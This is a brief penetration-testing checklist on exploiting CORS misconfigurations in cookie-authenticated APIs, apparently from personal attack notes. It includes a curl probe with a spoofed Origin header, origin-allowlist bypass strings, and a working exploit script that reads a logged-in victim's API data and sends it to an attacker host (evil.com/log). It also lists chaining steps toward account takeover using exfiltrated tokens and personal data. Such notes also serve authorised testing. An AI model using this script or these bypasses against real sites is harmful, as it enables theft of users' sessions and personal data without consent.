# CORS Misconfiguration

## Before I start
- [ ] API with cookie-auth sessions; something worth reading cross-origin

## Test
curl -s -I http://target/api/me -H "Origin: https://evil.com" -H "Cookie: session=..."
- [ ] ACAO: https://evil.com + ACAC: true = exploitable
- [ ] ACAO: null → sandboxed iframe PoC
- [ ] ACAO: * + credentials = browsers refuse; look for the reflected-origin variant instead
- [ ] Whitelist regex → try trusted.com.evil.com, eviltrusted.com, trusted.com@evil.com

## Exploit
<script>
fetch('https://target/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/log?d='+btoa(d)))
</script>
- [ ] Serve on my page; victim (logged in) visits → their data hits my listener

## Chain options
- [ ] Subdomain takeover of a whitelisted origin → serve PoC from "trusted"
- [ ] XSS on any whitelisted subdomain → read the whole API through it: :Pb xss
- [ ] No credentials flag → still useful against IP-authed intranet apps

## If it fails
- [ ] Static allowlist, no reflection, no null → CORS solid
- [ ] Only public data readable → severity argument weak; move on

## Next
- [ ] Exfil'd tokens/PII → account access: :Pb api
- [ ] Cross-origin redirect chains: :Pb oauth
